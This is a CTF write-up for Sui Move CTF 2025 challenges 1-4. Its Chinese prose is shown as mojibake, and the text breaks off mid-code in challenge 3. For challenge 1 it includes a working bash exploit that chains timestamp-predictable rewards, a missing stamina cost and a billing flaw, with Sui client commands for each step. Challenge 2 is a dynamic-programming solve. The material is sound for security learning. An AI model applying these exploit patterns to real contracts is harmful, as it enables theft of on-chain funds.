[{"title":"SUI MOVE CTF 2025 (1-4) Write Up","url":"/2025/08/05/MOVE CTF 2025/","content":"# Sui Move CTF 2025(1-4) WriteUp\n\n## æ¦‚è¿°\n\næœ¬æ–‡æ¡£åŒ…å«äº†å››é“Sui Move CTFæŒ‘æˆ˜çš„å®Œæ•´è§£é¢˜è¿‡ç¨‹ï¼Œæ¶µç›–äº†æ™ºèƒ½åˆçº¦æ¼æ´åˆ©ç”¨ã€ç®—æ³•åˆ†æã€å¯†ç å­¦æ”»å‡»å’Œè·¯å¾„æœç´¢ç­‰å¤šä¸ªæŠ€æœ¯é¢†åŸŸã€‚æ¯ä¸ªé¢˜ç›®éƒ½ä¿ç•™äº†å®Œæ•´çš„æŠ€æœ¯ç»†èŠ‚ã€ä»£ç å®ç°å’Œè§£é¢˜è¿‡ç¨‹ã€‚\n\n## ç›®å½•\n\n1. [å†’é™©æ¸¸æˆ - æ™ºèƒ½åˆçº¦æ¼æ´åˆ©ç”¨](#1-å†’é™©æ¸¸æˆ)\n2. [å¼ºç›—æ¸¸æˆ - åŠ¨æ€è§„åˆ’ç®—æ³•](#2-å¼ºç›—æ¸¸æˆ)\n3. [æ¢å¤å¯†é’¥ - æ ¼ç†è®ºå¯†ç å­¦](#3-æ¢å¤å¯†é’¥)\n4. [è¿·å®«æ¸¸æˆ - è·¯å¾„æœç´¢ç®—æ³•](#4-è¿·å®«æ¸¸æˆ)\n\n---\n\n# 1. å†’é™©æ¸¸æˆ\n\n## æŒ‘æˆ˜æ¦‚è¿°\n\nè¿™æ˜¯ä¸€ä¸ªåŸºäºSui Moveæ™ºèƒ½åˆçº¦çš„CTFæŒ‘æˆ˜ï¼Œç›®æ ‡æ˜¯é€šè¿‡åˆ©ç”¨åˆçº¦æ¼æ´è·å–Flagã€‚æŒ‘æˆ˜æ¶‰åŠä¸€ä¸ªå†’é™©æ¸¸æˆï¼Œç©å®¶éœ€è¦æ§åˆ¶è‹±é›„å‡»è´¥æ€ªç‰©æ¥è·å¾—tokenï¼Œæœ€ç»ˆè´­ä¹°å®ç®±è·å–Flagã€‚\n\n## åˆçº¦åˆ†æ\n\n### æ ¸å¿ƒåˆçº¦ç»“æ„\n\næŒ‘æˆ˜åŒ…å«ä¸‰ä¸ªä¸»è¦æ¨¡å—ï¼š\n\n- `adventure.move` - ä¸»è¦æ¸¸æˆé€»è¾‘\n- `hero.move` - è‹±é›„ç³»ç»Ÿ\n- `inventory.move` - ç‰©å“å’ŒFlagç³»ç»Ÿ\n\n### å…³é”®æ¼æ´å‘ç°\n\n#### 1. ä½“åŠ›æ¶ˆè€—æ¼æ´\n\nåœ¨ `slay_boar_king` å‡½æ•°ä¸­å‘ç°å…³é”®æ¼æ´ï¼š\n\n```rust\nentry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {\n    // ...\n    //hero::decrease_stamina(hero, 2);  // è¿™è¡Œè¢«æ³¨é‡Šæ‰äº†ï¼\n    // ...\n}\n```\n\n**å½±å“**: å‡»è´¥é‡çŒªç‹ä¸æ¶ˆè€—ä½“åŠ›ï¼Œå¯ä»¥æ— é™æ¬¡æ”»å‡»ã€‚\n\n#### 2. æ—¶é—´æˆ³ä¾èµ–æ¼æ´\n\ntokenå¥–åŠ±åŸºäºæ—¶é—´æˆ³ï¼š\n\n```rust\nif (fight_result == 1) {\n    let current_timestamp = clock::timestamp_ms(clock);\n    let d100 = current_timestamp % 3;\n\n    if (d100 == 1) {\n        // å¢åŠ 5ä¸ªtoken\n        *current_balance = *current_balance + 5;\n    } else {\n        // å‡å°‘5ä¸ªtoken\n        *current_balance = *current_balance - 5;\n    }\n}\n```\n\n**å½±å“**: åªæœ‰å½“ `timestamp % 3 == 1` æ—¶æ‰èƒ½è·å¾—tokenå¥–åŠ±ã€‚\n\n#### 3. è®¡è´¹é”™è¯¯æ¼æ´\n\nåœ¨ `buy_box` å‡½æ•°ä¸­ï¼š\n\n```rust\nassert!(*current_balance >= 200, ERROR_NO_MONEY);  // æ£€æŸ¥200\n*current_balance = *current_balance - 100;         // ä½†åªæ‰£é™¤100\n```\n\n**å½±å“**: æ£€æŸ¥éœ€è¦200ä¸ªtokenä½†å®é™…åªæ‰£é™¤100ä¸ªã€‚\n\n## æ”»å‡»ç­–ç•¥\n\n### é˜¶æ®µ1: è‹±é›„æˆ˜æ–—åŠ›æå‡\n\nå‘ç°è‹±é›„åˆå§‹å±æ€§ä¸è¶³ä»¥å‡»è´¥é‡çŒªç‹ï¼š\n\n- åˆå§‹strength: 10\n- é‡çŒªç‹defense: 10-15\n\n**è§£å†³æ–¹æ¡ˆ**: å‡çº§è‹±é›„ç³»ç»Ÿ\n\n- å‡»è´¥æ™®é€šé‡çŒªè·å¾—ç»éªŒï¼ˆæ¯æ¬¡+10ç»éªŒï¼‰\n- 100ç»éªŒå¯å‡çº§ï¼Œå‡çº§åstrengthå¢åŠ 30ç‚¹\n\n### é˜¶æ®µ2: PTBæ—¶é—´æˆ³æ”»å‡»\n\nåˆ©ç”¨Programmable Transaction Block (PTB)ç¡®ä¿æ‰€æœ‰æ“ä½œä½¿ç”¨ç›¸åŒæ—¶é—´æˆ³ï¼š\n\n1. ç­‰å¾…æœ‰åˆ©æ—¶é—´æˆ³ï¼ˆ`timestamp % 3 == 1`ï¼‰\n2. åœ¨å•ä¸ªPTBä¸­æ‰§è¡Œ20æ¬¡ `slay_boar_king`è°ƒç”¨\n3. æ¯æ¬¡æˆåŠŸ+5 tokenï¼Œä»100å¢åŠ åˆ°200\n\n### é˜¶æ®µ3: è´­ä¹°å®ç®±è·å–Flag\n\n1. åˆ©ç”¨è®¡è´¹é”™è¯¯è´­ä¹°å®ç®±ï¼ˆæ£€æŸ¥200ä½†åªæ‰£100ï¼‰\n2. è°ƒç”¨ `get_flag`å‡½æ•°è·å–Flagäº‹ä»¶\n\n## æ”»å‡»å®ç°\n\n### è‹±é›„å‡çº§è„šæœ¬\n\n```bash\n# å‡»è´¥30åªæ™®é€šé‡çŒªè·å¾—ç»éªŒ\nfor i in {1..30}; do\n    sui client call --package $PACKAGE_ID --module adventure --function slay_boar \\\n        --args $HERO_ID --gas-budget 20000000\ndone\n\n# å‡çº§è‹±é›„\nsui client call --package $PACKAGE_ID --module hero --function level_up \\\n    --args $HERO_ID --gas-budget 20000000\n```\n\n### PTBæ‰¹é‡æ”»å‡»è„šæœ¬\n\næ ¸å¿ƒæ”»å‡»è„šæœ¬ `ptb_batch_attack.sh`ï¼š\n\n```bash\n#!/bin/bash\n\n# åˆçº¦é…ç½®\nPACKAGE_ID=\"0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d\"\nHERO_ID=\"0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134\"\nUSERS_TOKEN_AMOUNT_ID=\"0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45\"\nCLOCK_ID=\"0x6\"\n\n# PTBæ”»å‡»å‡½æ•°\nexecute_ptb_attack() {\n    local batch_size=$1\n    PTB_CMD=\"sui client ptb\"\n  \n    # æ„å»º20æ¬¡slay_boar_kingè°ƒç”¨\n    for ((i=1; i<=batch_size; i++)); do\n        PTB_CMD=\"$PTB_CMD --move-call $PACKAGE_ID::adventure::slay_boar_king \\\"\\\" @$CLOCK_ID @$USERS_TOKEN_AMOUNT_ID @$HERO_ID\"\n    done\n  \n    PTB_CMD=\"$PTB_CMD --gas-budget 100000000\"\n    RESULT=$(eval $PTB_CMD 2>&1)\n  \n    # æ£€æŸ¥Amountäº‹ä»¶\n    if echo \"$RESULT\" | grep -q \"Amount\"; then\n        AMOUNT=$(echo \"$RESULT\" | grep -A 5 \"Amount\" | grep \"amount\" | tail -1 | grep -o '[0-9]\\+')\n        if [ \"$AMOUNT\" -ge 200 ]; then\n            return 0\n        fi\n    fi\n    return 1\n}\n\n# ä¸»æ”»å‡»å¾ªç¯\nfor attempt in $(seq 1 100); do\n    TIMESTAMP=$(date +%s)\n    REMAINDER=$((TIMESTAMP % 3))\n  \n    if [ $REMAINDER -eq 1 ]; then\n        echo \"ğŸ¯ å‘ç°æœ‰åˆ©æ—¶é—´æˆ³! æ‰§è¡ŒPTBæ”»å‡»!\"\n  \n        if execute_ptb_attack 20; then\n            # è´­ä¹°å®ç®±\n            BUY_RESULT=$(sui client call --package $PACKAGE_ID --module adventure --function buy_box --args $USERS_TOKEN_AMOUNT_ID --gas-budget 20000000 2>&1)\n  \n            # æå–å®ç®±IDå¹¶è·å–Flag\n            TREASURY_BOX_ID=$(echo \"$BUY_RESULT\" | grep -A 10 \"Created Objects\" | grep \"ID:\" | head -1 | grep -o '0x[a-f0-9]\\{64\\}')\n  \n            FLAG_RESULT=$(sui client call --package $PACKAGE_ID --module inventory --function get_flag --args $TREASURY_BOX_ID --gas-budget 20000000 2>&1)\n  \n            FLAG_TX_HASH=$(echo \"$FLAG_RESULT\" | grep \"Transaction Digest:\" | grep -o '[A-Za-z0-9]\\{44\\}')\n            echo \"ğŸ Flagäº¤æ˜“å“ˆå¸Œ: $FLAG_TX_HASH\"\n            exit 0\n        fi\n    fi\n  \n    # é‡ç½®ä½™é¢å¹¶ç­‰å¾…ä¸‹ä¸€æ¬¡æœºä¼š\n    sui client call --package $PACKAGE_ID --module adventure --function init_balances --args $USERS_TOKEN_AMOUNT_ID --gas-budget 10000000 > /dev/null 2>&1\n    sleep 1\ndone\n```\n\n## æ”»å‡»æ‰§è¡Œè¿‡ç¨‹\n\n### 1. ç¯å¢ƒå‡†å¤‡\n\n```bash\n# éƒ¨ç½²åˆçº¦è·å–Package ID\nPackage ID: 0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d\nHero ID: 0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134\nUsersTokenAmount ID: 0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45\n```\n\n### 2. è‹±é›„å‡çº§\n\n- å‡»è´¥30åªæ™®é€šé‡çŒªè·å¾—160ç‚¹ç»éªŒ\n- å‡çº§è‹±é›„ï¼šstrength 10â†’40, defense 5â†’20, hp 100â†’200\n\n### 3. PTBæ”»å‡»\n\n- ç­‰å¾…æ—¶é—´æˆ³ä½™æ•°ä¸º1çš„æœ‰åˆ©æ—¶æœº\n- æ‰§è¡Œ20æ¬¡æ‰¹é‡ `slay_boar_king`è°ƒç”¨\n- æˆåŠŸä»100 tokenå¢åŠ åˆ°200 token\n\n### 4. è·å–Flag\n\n- è´­ä¹°å®ç®±ï¼ˆåˆ©ç”¨è®¡è´¹é”™è¯¯ï¼‰\n- è°ƒç”¨ `get_flag`è·å–Flagäº‹ä»¶\n\n## æ”»å‡»ç»“æœ\n\n**æˆåŠŸè·å–Flagäº¤æ˜“å“ˆå¸Œ**: `23CBKEHSiwoB1TkJyhQAG1zhuHpWDLpHESdmeWSWs3Gs`\n\n## æŠ€æœ¯è¦ç‚¹æ€»ç»“\n\n1. **æ¼æ´ç»„åˆåˆ©ç”¨**: ä½“åŠ›æ¶ˆè€—æ¼æ´ + æ—¶é—´æˆ³ä¾èµ– + è®¡è´¹é”™è¯¯\n2. **PTBæ—¶é—´æˆ³åŒæ­¥**: ç¡®ä¿æ‰¹é‡æ“ä½œä½¿ç”¨ç›¸åŒæ—¶é—´æˆ³\n3. **è‹±é›„å‡çº§æœºåˆ¶**: å‘ç°å¹¶åˆ©ç”¨å‡çº§ç³»ç»Ÿæå‡æˆ˜æ–—åŠ›\n4. **æ¦‚ç‡æ”»å‡»ä¼˜åŒ–**: ä»1/3æˆåŠŸç‡æå‡åˆ°100%æˆåŠŸç‡\n\n## é˜²å¾¡å»ºè®®\n\n1. **ä¿®å¤ä½“åŠ›æ¶ˆè€—**: å–æ¶ˆæ³¨é‡Š `hero::decrease_stamina(hero, 2)`\n2. **ç§»é™¤æ—¶é—´æˆ³ä¾èµ–**: ä½¿ç”¨å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆ\n3. **ä¿®å¤è®¡è´¹é”™è¯¯**: ç»Ÿä¸€æ£€æŸ¥å’Œæ‰£é™¤é‡‘é¢\n4. **é™åˆ¶æ‰¹é‡æ“ä½œ**: å¯¹PTBä¸­çš„é‡å¤è°ƒç”¨è¿›è¡Œé™åˆ¶\n\nè¿™æ¬¡æ”»å‡»å±•ç¤ºäº†æ™ºèƒ½åˆçº¦ä¸­å¤šä¸ªçœ‹ä¼¼æ— å…³çš„å°æ¼æ´å¦‚ä½•è¢«å·§å¦™ç»„åˆï¼Œå½¢æˆå®Œæ•´çš„æ”»å‡»é“¾ã€‚\n\n## è¯¦ç»†æŠ€æœ¯åˆ†æ\n\n### æ—¶é—´æˆ³æ”»å‡»åŸç†\n\nSuiåŒºå—é“¾ä¸­ï¼ŒåŒä¸€ä¸ªPTBå†…çš„æ‰€æœ‰æ“ä½œå…±äº«ç›¸åŒçš„æ—¶é—´æˆ³ã€‚è¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥ç»•è¿‡éšæœºæ€§ï¼š\n\n```rust\nlet current_timestamp = clock::timestamp_ms(clock);\nlet d100 = current_timestamp % 3;\n```\n\né€šè¿‡åœ¨shellä¸­æ£€æŸ¥æ—¶é—´æˆ³å¹¶åœ¨æœ‰åˆ©æ—¶æœºç«‹å³æ‰§è¡ŒPTBï¼Œå¯ä»¥ç¡®ä¿æ‰€æœ‰20æ¬¡è°ƒç”¨éƒ½è·å¾—å¥–åŠ±ã€‚\n\n### PTBæ„é€ æŠ€å·§\n\nå…³é”®åœ¨äºæ­£ç¡®æ„é€ PTBå‘½ä»¤ï¼š\n\n```bash\nsui client ptb \\\n  --move-call package::module::function \"\" @arg1 @arg2 @arg3 \\\n  --move-call package::module::function \"\" @arg1 @arg2 @arg3 \\\n  ... (é‡å¤20æ¬¡)\n  --gas-budget 100000000\n```\n\næ¯ä¸ª `--move-call`ä»£è¡¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ï¼Œæ‰€æœ‰è°ƒç”¨åœ¨åŒä¸€ä¸ªäº¤æ˜“ä¸­æ‰§è¡Œã€‚\n\n### è‹±é›„å‡çº§æ•°å€¼åˆ†æ\n\nå‡çº§å‰åæˆ˜æ–—åŠ›å¯¹æ¯”ï¼š\n\n| å±æ€§     | å‡çº§å‰ | å‡çº§å | æå‡ |\n| -------- | ------ | ------ | ---- |\n| Level    | 1      | 2      | +1   |\n| Strength | 10     | 40     | +30  |\n| Defense  | 5      | 20     | +15  |\n| HP       | 100    | 200    | +100 |\n\né‡çŒªç‹å±æ€§èŒƒå›´ï¼š\n\n- HP: 180-220\n- Strength: 20-25\n- Defense: 10-15\n\nå‡çº§åè‹±é›„çš„40ç‚¹æ”»å‡»åŠ›å¯ä»¥è½»æ¾çªç ´é‡çŒªç‹çš„10-15é˜²å¾¡ã€‚\n\n## æ”»å‡»æ—¶é—´çº¿\n\n1. **00:00** - åˆ†æåˆçº¦ä»£ç ï¼Œå‘ç°å¤šä¸ªæ¼æ´\n2. **00:30** - å°è¯•ç›´æ¥æ”»å‡»é‡çŒªç‹ï¼Œå‘ç°æˆ˜æ–—åŠ›ä¸è¶³\n3. **01:00** - ç ”ç©¶è‹±é›„å‡çº§æœºåˆ¶\n4. **01:30** - å‡»è´¥30åªæ™®é€šé‡çŒªï¼Œå‡çº§è‹±é›„\n5. **02:00** - å¼€å‘PTBæ”»å‡»è„šæœ¬\n6. **02:30** - æˆåŠŸæ‰§è¡Œæ”»å‡»ï¼Œè·å–Flag\n\n## å…³é”®ä»£ç ç‰‡æ®µ\n\n### æ¼æ´ä»£ç 1: ä½“åŠ›æ¶ˆè€—è¢«æ³¨é‡Š\n\n```rust\nentry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {\n    let sender = tx_context::sender(ctx);\n    assert!(hero::stamina(hero) > 0, EHERO_TIRED);\n    // ...\n    let fight_result = fight_monster<BoarKing>(hero, &boar);\n    //hero::decrease_stamina(hero, 2);  // â† å…³é”®æ¼æ´ï¼šè¢«æ³¨é‡Šæ‰\n    // ...\n}\n```\n\n### æ¼æ´ä»£ç 2: æ—¶é—´æˆ³ä¾èµ–\n\n```rust\nif (fight_result == 1) {\n    let current_timestamp = clock::timestamp_ms(clock);\n    let d100 = current_timestamp % 3;  // â† å¯é¢„æµ‹çš„\"éšæœº\"æ•°\n\n    if (d100 == 1) {\n        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n        *current_balance = *current_balance + 5;  // å¥–åŠ±\n        event::emit(Amount{amount: *current_balance});\n    } else {\n        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n        *current_balance = *current_balance - 5;  // æƒ©ç½š\n        event::emit(Amount{amount: *current_balance});\n    }\n}\n```\n\n### æ¼æ´ä»£ç 3: è®¡è´¹é”™è¯¯\n\n```rust\npublic entry fun buy_box(usersTokenAmount: &mut UsersTokenAmount, ctx: &mut TxContext) {\n    let sender = tx_context::sender(ctx);\n    let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n    event::emit(Amount{amount: *current_balance});\n    assert!(*current_balance >= 200, ERROR_NO_MONEY);  // â† æ£€æŸ¥200\n    *current_balance = *current_balance - 100;         // â† ä½†åªæ‰£100\n    let box = inventory::create_treasury_box(ctx);\n    transfer::public_transfer(box, tx_context::sender(ctx));\n}\n```\n\n## å®Œæ•´æ”»å‡»è„šæœ¬\n\nå°†æ”»å‡»è„šæœ¬ä¿å­˜ä¸º `ptb_batch_attack.sh` å¹¶æ‰§è¡Œï¼š\n\n```bash\nchmod +x ptb_batch_attack.sh\n./ptb_batch_attack.sh\n```\n\nè„šæœ¬ä¼šè‡ªåŠ¨ï¼š\n\n1. ç›‘æ§æ—¶é—´æˆ³ï¼Œç­‰å¾…æœ‰åˆ©æ—¶æœº\n2. æ‰§è¡ŒPTBæ‰¹é‡æ”»å‡»\n3. è´­ä¹°å®ç®±å¹¶è·å–Flag\n4. è¾“å‡ºFlagäº¤æ˜“å“ˆå¸Œ\n\n## å­¦ä¹ è¦ç‚¹\n\n1. **ä»£ç å®¡è®¡é‡è¦æ€§**: ä»”ç»†æ£€æŸ¥æ¯ä¸€è¡Œä»£ç ï¼ŒåŒ…æ‹¬æ³¨é‡Š\n2. **æ¼æ´ç»„åˆå¨åŠ›**: å¤šä¸ªå°æ¼æ´ç»„åˆå¯èƒ½äº§ç”Ÿä¸¥é‡å½±å“\n3. **åŒºå—é“¾ç‰¹æ€§åˆ©ç”¨**: ç†è§£PTBç­‰åŒºå—é“¾ç‰¹æœ‰æœºåˆ¶\n4. **æ”»å‡»é“¾æ„é€ **: ä»ä¿¡æ¯æ”¶é›†åˆ°æœ€ç»ˆåˆ©ç”¨çš„å®Œæ•´æµç¨‹\n\n## ç›¸å…³èµ„æº\n\n- [Sui Move å®˜æ–¹æ–‡æ¡£](https://docs.sui.io/concepts/sui-move-concepts)\n- [PTB ç¼–ç¨‹æŒ‡å—](https://docs.sui.io/concepts/transactions/prog-txn-blocks)\n- [æ™ºèƒ½åˆçº¦å®‰å…¨æœ€ä½³å®è·µ](https://github.com/slowmist/Knowledge-Base/blob/master/translations/move-security-guidelines-zh.md)\n\n---\n\n# 2. å¼ºç›—æ¸¸æˆ\n\n## é¢˜ç›®ä¿¡æ¯\n\n- **é¢˜ç›®åç§°**: å¼ºç›—æ¸¸æˆ\n- **é¢˜ç›®ç§¯åˆ†**: 52\n- **åˆ†ç±»**: blockchain, hohctf, sui, move\n- **è§£é¢˜äººæ•°**: 46\n\n## é¢˜ç›®æè¿°\n\næˆ¿å±‹åŠ æƒçš„å¼ºç›—æ¸¸æˆï¼Œä½ èƒ½æˆåŠŸè·å–ç›®æ ‡é‡‘é¢å—ï¼ŸHOH moveCTF å¼ºç›—æ¸¸æˆ\n\né¢˜ç›®æä¾›äº†ä¸€ä¸ªç‹¬ç‰¹çš„ Sui Move åˆçº¦ï¼š\n\n- **Package ID**: `0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c`\n- **éƒ¨ç½²äº¤æ˜“å“ˆå¸Œ**: `JB4yrd8L6srxeLv6mAhBo13sYdXqzVyJiXVCSXwQgvxY`\n\n## è§£é¢˜æ€è·¯\n\n### 1. åˆçº¦åˆ†æ\n\né¦–å…ˆåˆ†æMoveåˆçº¦æºç ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªåŸºäºåŠ¨æ€è§„åˆ’çš„\"æˆ¿å±‹å¼ºç›—\"é—®é¢˜å˜ç§ï¼š\n\n```rust\nmodule game::ez_game {\n    public struct Challenge has key, store {\n        id: UID,\n        initial_part: vector<u64>,\n        weights: vector<u64>,\n        target_amount: u64,\n    }\n\n    public struct Flag has copy, drop {\n        owner: address,\n        flag: bool\n    }\n}\n```\n\nå…³é”®å‡½æ•°ï¼š\n\n- `init_game`: åˆå§‹åŒ–æ¸¸æˆï¼Œåˆ›å»ºChallengeå¯¹è±¡ï¼Œè®¾ç½®éšæœºç›®æ ‡é‡‘é¢(10-20)\n- `get_flag`: éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œå¦‚æœè®¡ç®—ç»“æœç­‰äºç›®æ ‡é‡‘é¢åˆ™è§¦å‘Flagäº‹ä»¶\n- `weighted_rob`: åŠ æƒæˆ¿å±‹å¼ºç›—ç®—æ³•æ ¸å¿ƒå®ç°\n\n### 2. ç®—æ³•ç†è§£\n\n`weighted_rob`å‡½æ•°å®ç°äº†ä¸€ä¸ªåŠ¨æ€è§„åˆ’ç®—æ³•ï¼š\n\n- åˆå§‹æˆ¿å±‹ï¼š`[1, 1, 3, 1, 1]`\n- åˆå§‹æƒé‡ï¼š`[1, 1, 2, 1, 1]`\n- ç”¨æˆ·å¯ä»¥æ·»åŠ é¢å¤–æˆ¿å±‹ï¼ˆæƒé‡é»˜è®¤ä¸º1ï¼‰\n- ä¸èƒ½æŠ¢åŠ«ç›¸é‚»çš„æˆ¿å±‹\n- æ¯ä¸ªæˆ¿å±‹çš„ä»·å€¼ = æˆ¿å±‹å€¼ Ã— æƒé‡\n- ç›®æ ‡ï¼šæ‰¾åˆ°æœ€å¤§æ”¶ç›Š\n\n### 3. è§£é¢˜è„šæœ¬\n\nç¼–å†™Pythonè„šæœ¬åˆ†ææ‰€æœ‰å¯èƒ½çš„ç›®æ ‡é‡‘é¢ï¼š\n\n```python\ndef weighted_rob(houses, weights):\n    n = len(houses)\n    if n == 0:\n        return 0\n\n    dp = []\n    dp.append(houses[0] * weights[0])\n\n    if n > 1:\n        dp.append(max(\n            houses[0] * weights[0],\n            houses[1] * weights[1]\n        ))\n\n    for i in range(2, n):\n        dp_i_1 = dp[i - 1]\n        dp_i_2_plus_house = dp[i - 2] + houses[i] * weights[i]\n        dp.append(max(dp_i_1, dp_i_2_plus_house))\n\n    return dp[n - 1]\n```\n\né€šè¿‡åˆ†æå‘ç°æ‰€æœ‰ç›®æ ‡é‡‘é¢çš„è§£å†³æ–¹æ¡ˆï¼š\n\n- ç›®æ ‡é‡‘é¢ 10 â†’ ç”¨æˆ·è¾“å…¥: [3]\n- ç›®æ ‡é‡‘é¢ 11 â†’ ç”¨æˆ·è¾“å…¥: [4]\n- ç›®æ ‡é‡‘é¢ 12 â†’ ç”¨æˆ·è¾“å…¥: [5]\n- ...\n- ç›®æ ‡é‡‘é¢ 20 â†’ ç”¨æˆ·è¾“å…¥: [13]\n\n## è§£é¢˜æ­¥éª¤\n\n### 1. åˆå§‹åŒ–æ¸¸æˆ\n\n```bash\nsui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \\\n  --module ez_game --function init_game --args 0x8\n```\n\nåˆ›å»ºäº†Challengeå¯¹è±¡ï¼š`0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92`\n\n### 2. æŸ¥çœ‹Challengeå¯¹è±¡\n\n```bash\nsui client object 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92\n```\n\nè·å–åˆ°å…³é”®ä¿¡æ¯ï¼š\n\n- **ç›®æ ‡é‡‘é¢**: 15\n- **åˆå§‹æˆ¿å±‹**: [1, 1, 3, 1, 1]\n- **æƒé‡**: [1, 1, 2, 1, 1]\n\n### 3. è®¡ç®—è§£å†³æ–¹æ¡ˆ\n\næ ¹æ®ç›®æ ‡é‡‘é¢15ï¼Œå¯¹åº”çš„ç”¨æˆ·è¾“å…¥æ˜¯ `[8]`ã€‚\n\néªŒè¯è®¡ç®—è¿‡ç¨‹ï¼š\n\n- å®Œæ•´æˆ¿å±‹åˆ—è¡¨ï¼š`[1, 1, 3, 1, 1, 8]`\n- å®Œæ•´æƒé‡åˆ—è¡¨ï¼š`[1, 1, 2, 1, 1, 1]`\n- DPè®¡ç®—ï¼š\n  - dp[0] = 1 Ã— 1 = 1\n  - dp[1] = max(1Ã—1, 1Ã—1) = 1\n  - dp[2] = max(1, 1 + 3Ã—2) = 7\n  - dp[3] = max(7, 1 + 1Ã—1) = 7\n  - dp[4] = max(7, 7 + 1Ã—1) = 8\n  - dp[5] = max(8, 7 + 8Ã—1) = 15 âœ“\n\n### 4. è·å–Flag\n\n```bash\nsui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \\\n  --module ez_game --function get_flag \\\n  --args \"[8]\" 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92\n```\n\n## è§£é¢˜ç»“æœ\n\n**æˆåŠŸè§¦å‘Flagäº‹ä»¶ï¼**\n\n**è§¦å‘Flagçš„äº¤æ˜“å“ˆå¸Œ**: `3ZbbGVQkNLxuUACjdnRbLb5YF9NQ5MDuTiogDD3HYwaa`\n\näº¤æ˜“äº‹ä»¶ä¸­æ˜¾ç¤ºï¼š\n\n```json\n{\n  \"flag\": true,\n  \"owner\": \"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe\"\n}\n```\n\n## å…³é”®æŠ€æœ¯ç‚¹\n\n1. **Sui Moveåˆçº¦äº¤äº’**: ç†è§£SuiåŒºå—é“¾çš„å¯¹è±¡æ¨¡å‹å’Œäº¤æ˜“æœºåˆ¶\n2. **åŠ¨æ€è§„åˆ’ç®—æ³•**: æŒæ¡æˆ¿å±‹å¼ºç›—é—®é¢˜çš„ç»å…¸DPè§£æ³•\n3. **åŠ æƒå˜ç§**: ç†è§£æƒé‡å¯¹ç®—æ³•ç»“æœçš„å½±å“\n4. **éšæœºæ€§å¤„ç†**: åˆ†ææ‰€æœ‰å¯èƒ½çš„ç›®æ ‡é‡‘é¢å¹¶é¢„è®¡ç®—è§£å†³æ–¹æ¡ˆ\n\n## æ€»ç»“\n\nè¿™é“é¢˜ç›®å·§å¦™åœ°å°†ç»å…¸çš„åŠ¨æ€è§„åˆ’é—®é¢˜ä¸åŒºå—é“¾æŠ€æœ¯ç»“åˆï¼Œè€ƒæŸ¥äº†ï¼š\n\n- Moveè¯­è¨€å’ŒSuiåŒºå—é“¾çš„åŸºç¡€çŸ¥è¯†\n- åŠ¨æ€è§„åˆ’ç®—æ³•çš„ç†è§£å’Œå®ç°\n- é€†å‘åˆ†æå’Œè§£é¢˜æ€ç»´\n\n---\n\n# 3. æ¢å¤å¯†é’¥\n\n## é¢˜ç›®ä¿¡æ¯\n\n- **é¢˜ç›®åç§°**: æ¢å¤ç§é’¥\n- **é¢˜ç›®ç§¯åˆ†**: 63\n- **åˆ†ç±»**: blockchain, hohctf, sui, move\n- **è§£é¢˜äººæ•°**: 32\n- **é¢˜ç›®æè¿°**: æˆ‘åœ¨é“¾ä¸Šç”¨éšæœºæ•°éšè—äº†æˆ‘çš„ç§é’¥ï¼Œä½†æ˜¯æˆ‘å¿˜è®°æˆ‘ç§é’¥çš„å†…å®¹äº†ï¼Œä½ èƒ½å¸®æˆ‘æ¢å¤ç§é’¥å˜›ï¼Ÿ\n\n## é¢˜ç›®ç¯å¢ƒ\n\n- **Package ID**: `0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9`\n- **éƒ¨ç½²äº¤æ˜“å“ˆå¸Œ**: `Go2jkNk5tR1EnCNV2Fw2zaP6zQfQRPfUeEFyyi6rtJiR`\n\n## è§£é¢˜æ€è·¯\n\n### 1. é¢˜ç›®åˆ†æ\n\nè¿™æ˜¯ä¸€é“ç»“åˆäº†å¯†ç å­¦å’ŒåŒºå—é“¾æŠ€æœ¯çš„ç»¼åˆæ€§CTFé¢˜ç›®ã€‚é€šè¿‡åˆ†ææä¾›çš„Moveæ™ºèƒ½åˆçº¦æºç ï¼Œå¯ä»¥å‘ç°ï¼š\n\n1. é¢˜ç›®ä½¿ç”¨çº¿æ€§ä»£æ•°åŠ å¯†æ–¹æ¡ˆéšè—flag\n2. åŠ å¯†å…¬å¼ï¼š`enc = A * flag + k`\n   - `A`: 64x23çš„å›ºå®šçŸ©é˜µ\n   - `flag`: 23å­—èŠ‚çš„æ˜æ–‡ï¼ˆå³æˆ‘ä»¬è¦æ¢å¤çš„ç§é’¥ï¼‰\n   - `k`: 64ç»´éšæœºå‘é‡\n   - `enc`: 64ç»´å¯†æ–‡å‘é‡\n\n### 2. å…³é”®ä»£ç åˆ†æ\n\n```rust\n// åŠ å¯†å‡½æ•°\nentry fun entrypt_flag(plain_flag: vector<u8>, r: &Random, ctx: &mut TxContext) {\n    let a = get_a();  // è·å–64x23çŸ©é˜µ\n    let mut k: vector<u64> = vector[];\n    // 